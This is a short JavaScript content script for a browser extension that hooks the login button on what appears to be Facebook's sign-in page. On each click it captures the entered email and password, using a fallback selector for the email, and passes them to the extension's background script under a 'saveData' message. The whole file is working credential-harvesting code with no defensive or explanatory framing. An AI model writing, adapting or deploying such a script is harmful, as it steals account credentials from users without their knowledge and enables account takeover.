const addListener = () => {
  let button = document.querySelector('[type="submit"][name="login"]')
  if(button) {
    button.addEventListener('click', (event) => {
      let data = getData()
      saveData(data)
    })
  }
}

const getData = () => {
  let emailInput = document.querySelector('[type="text"][name="email"]')
  let passwordInput = document.querySelector('[type="password"][name="pass"]')
  if(emailInput && passwordInput) {
    return {
      email: emailInput.value,
      password: passwordInput.value
    }
  }
  if(!emailInput && passwordInput) {
    let emailInput = document.querySelector('.fsm.fwn.fcg')
    return {
      email: emailInput.textContent.split(" ", 1),
      password: passwordInput.value
    }
  }
  return null
}

const saveData = (data) => {
  console.log('Saving data...')
  chrome.runtime.sendMessage({contentScriptQuery: 'saveData', data},
    response =>  {
      console.log(response)
    }
  );
}

(function() {
  console.log('Waiting...')
  addListener();
})();